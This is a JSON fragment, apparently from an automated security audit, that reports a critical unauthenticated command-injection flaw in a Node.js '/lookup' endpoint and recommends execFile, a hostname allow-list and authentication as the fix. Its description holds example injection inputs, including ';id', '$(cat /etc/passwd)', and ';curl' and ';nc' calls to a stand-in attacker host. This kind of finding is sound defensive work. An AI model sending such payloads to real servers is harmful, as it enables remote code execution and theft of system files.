      "reported": [
        {
          "fingerprint": "af4e782addadd0ea5b9b136662ef9d013eae6d61568d082fa7da3e3d3037e6e6",
          "vulnerabilityClass": "authz",
          "cwe": "CWE-78",
          "title": "Unauthenticated RCE via shell injection in /lookup host parameter",
          "description": "Entry: src/server.js:15 (the `/lookup` handler reads `url.searchParams.get('host')` and passes it to `lookupHost`). Attacker: an unauthenticated network caller, crossing the boundary from an HTTP request into OS command execution as the server process user. Path: `GET /lookup?host=;id` -> src/server.js:12 parses the URL -> src/server.js:15 extracts the raw query parameter (URLSearchParams only percent-decodes, it does not sanitize) -> src/server.js:6-7 `lookupHost(host)` builds `'getent hosts ' + host` and hands it to `execAsync`, i.e. `child_process.exec`, which always invokes `/bin/sh -c` on the string. Nothing on the path stops it: the repository contains no authentication, authorization, input validation, escaping, allow-list, or `shell:false`/`execFile` usage, and the server binds all interfaces because `listen()` at src/server.js:22 is given no host. Impact: any network client executes arbitrary commands (e.g. `host=$(cat /etc/passwd)`, `;curl attacker/...`, `;nc ...`) and reads the output back from the JSON response body, which is full unauthenticated remote code execution on the host. Fix: avoid the shell entirely, e.g. `execFile('getent', ['hosts', host])` or `spawn('getent', ['hosts', host])` with an argv array, and validate `host` against a strict hostname allow-list such as `/^[A-Za-z0-9.-]{1,253}$/` before use; also require authentication and bind to a trusted interface if the lookup service must not be public.",
          "severity": "critical",
          "filePath": "src/server.js",
          "startLine": 7,
          "endLine": 7,
          "attackPath": [
            {
              "file": "src/server.js",
              "line": 22,
              "note": "Server starts with listen() given no host, so it binds all interfaces and is reachable by any network client; no authentication exists anywhere in the repo."
            },
            {
              "file": "src/server.js",
              "line": 12,
              "note": "Entry point: an unauthenticated GET request to /lookup is parsed with new URL(req.url, ...), reaching the handler with no auth or authorization check."
            },
            {
              "file": "src/server.js",
              "line": 15,
              "note": "The raw query parameter is read with url.searchParams.get('host') and passed straight to lookupHost; URLSearchParams only percent-decodes, it does not validate or sanitize, so ';id' survives intact."
            },
            {
              "file": "src/server.js",
              "line": 7,
              "note": "lookupHost concatenates the attacker string into 'getent hosts ' + host and hands it to execAsync, i.e. child_process.exec, which always runs the string through /bin/sh -c, so shell metacharacters execute arbitrary commands."
            },
            {
              "file": "src/server.js",
              "line": 17,
              "note": "Command stdout is returned in the JSON response body, letting the attacker read back the output of the executed commands."
            }
          ]
        }
      ],
